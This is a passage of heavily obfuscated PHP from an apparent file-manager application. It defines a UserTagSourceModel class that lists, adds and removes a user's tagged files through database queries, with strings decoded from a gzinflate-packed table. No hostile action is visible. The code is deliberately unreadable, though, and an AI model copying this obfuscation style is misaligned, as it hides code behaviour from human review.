$¿¬Ìì×ª[$ªÅØÄğû[352]][$¨‰öŠ×Ñ][1] = $Æ¿Ì‡Ë; $this->optionsValue($¿¬Ìì×ª); $¼‚±Ÿª += parent::delete($İÀ¾¥°ı); } return $¼‚±Ÿª; } private function findWhereField($ê–‰²Óê) { $éÇø›şı =& $_SERVER[§Êá¸İ]; $Ä“­şğ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ê–‰²Óê) || !is_array($ê–‰²Óê[$éÇø›şı[352]])) { return !1; } foreach ($ê–‰²Óê[$éÇø›şı[352]] as $²ïä²æú => $üå³¥›) { if (is_array($üå³¥›) && isset($üå³¥›[0]) && is_string($üå³¥›[0]) && strtolower($üå³¥›[0]) == $éÇø›şı[7] && is_array($üå³¥›[1]) && count($üå³¥›[1]) > $Ä“­şğ) { ignore_timeout(); return $²ïä²æú; } } return !1; } public function setMasterDB($­„ÉÙ×û = true) { think_config($_SERVER[§Êá¸İ][471], $­„ÉÙ×û); } } goto FÁÇµ‚œêÂ; dœ‹é‹ˆÎ: define($_SERVER[§Êá¸İ][0], $_SERVER[§Êá¸İ][1]); $_SERVER[µ–é µ] = explode($_SERVER[§Êá¸İ][2], gzinflate(substr($_SERVER[§Êá¸İ][3], 10, -8))); function binCheckEq($½Ğ½¾ùè, $ª¾ÆŠä‡) { return $½Ğ½¾ùè == $ª¾ÆŠä‡; } goto DğÍŠ‚Œµ—; aŞë¸ŒôÄé: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($¹¯ó°µõ) { $¨¥êÚ¾Œ =& $_SERVER[§Êá¸İ]; return array($¨¥êÚ¾Œ[2093] => array($¨¥êÚ¾Œ[2507] . USER_ID, $¨¥êÚ¾Œ[2094])); } protected function listData() { $ë½šÆë =& $_SERVER[§Êá¸İ]; $ïÍä°ÊÄ = array($ë½šÆë[1770] => USER_ID, $ë½šÆë[565] => array($ë½šÆë[2097], 0)); $€™Ä‹Ÿƒ = $ë½šÆë[2508]; $™©›ø¾¹ = $this->field($€™Ä‹Ÿƒ)->where($ïÍä°ÊÄ)->order($ë½šÆë[2100])->select(); return $™©›ø¾¹ ? $™©›ø¾¹ : array(); } protected function addToTag($÷—Åí˜Á, $˜Û¾ëÂº) { $éé“‘Ğ³ =& $_SERVER[§Êá¸İ]; if (!Model($éé“‘Ğ³[2244])->listData($˜Û¾ëÂº)) { return !1; } if (is_numeric($÷—Åí˜Á)) { $ÈÑìó«® = Model($éé“‘Ğ³[911])->pathInfo($÷—Åí˜Á); if (!$ÈÑìó«®) { return !1; } } else { $ÈÑìó«® = IO::infoSimple($÷—Åí˜Á); if (!$ÈÑìó«®) { return !1; } $Ö¹Æ¡à‡ = $ÈÑìó«®[$éé“‘Ğ³[32]]; $Ç¸æõÊ = $ÈÑìó«®[$éé“‘Ğ³[33]]; if (isset($ÈÑìó«®[$éé“‘Ğ³[493]])) { $Ç¸æõÊ = $ÈÑìó«®[$éé“‘Ğ³[493]] == $éé“‘Ğ³[91] ? $éé“‘Ğ³[78] : $éé“‘Ğ³[230]; } } $ì«ù·ê = array($éé“‘Ğ³[1770] => USER_ID, $éé“‘Ğ³[565] => $˜Û¾ëÂº, $éé“‘Ğ³[503] => $÷—Åí˜Á, $éé“‘Ğ³[504] => $Ç¸æõÊ ? $Ç¸æõÊ : $éé“‘Ğ³[498], $éé“‘Ğ³[502] => $Ö¹Æ¡à‡ ? $Ö¹Æ¡à‡ : $éé“‘Ğ³[12], $éé“‘Ğ³[1982] => 0); if ($this->where($ì«ù·ê)->find()) { return !1; } return $this->add($ì«ù·ê); } protected function removeFromTag($œ²ŒÊ£, $ˆ¦ëÓ¬™) { $°ÌÎ¦– =& $_SERVER[§Êá¸İ]; if (!Model($°ÌÎ¦–[2244])->listData($ˆ¦ëÓ¬™)) { return !1; } if (is_array($œ²ŒÊ£)) { $œ²ŒÊ£ = array($°ÌÎ¦–[7], $œ²ŒÊ£); } $€€Øó“• = array($°ÌÎ¦–[1770] => USER_ID, $°ÌÎ¦–[565] => $ˆ¦ëÓ¬™, $°ÌÎ¦–[503] => $œ²ŒÊ£); return $this->where($€€Øó“•)->delete(); } protected function removeByTag($É’ËŒöİ) { $’‚•¡Â„ =& $_SERVER[§Êá¸İ]; if (!$É’ËŒöİ) { return !1; } $ÓÂğä”¦ = array($’‚•¡Â„[1770] => USER_ID, $’‚•¡Â„[565] => $É’ËŒöİ); return $this->where($ÓÂğä”¦)->delete(); } protected function removeBySource($Õª‚¿®¾) { $…âÒƒ¤˜ =& $_SERVER[§Êá¸İ]; if (is_array($Õª‚¿®¾)) { $Õª‚¿®¾ = array($…âÒƒ¤˜[7], $Õª‚¿®¾); } $’áÈ¼ú“ = array($…âÒƒ¤˜[1770] => USER_ID, $…âÒƒ¤˜[565] => array($…âÒƒ¤˜[1102], 0), $…âÒƒ¤˜[503] => $Õª‚¿®¾); return $this->where($’áÈ¼ú“)->delete(); } }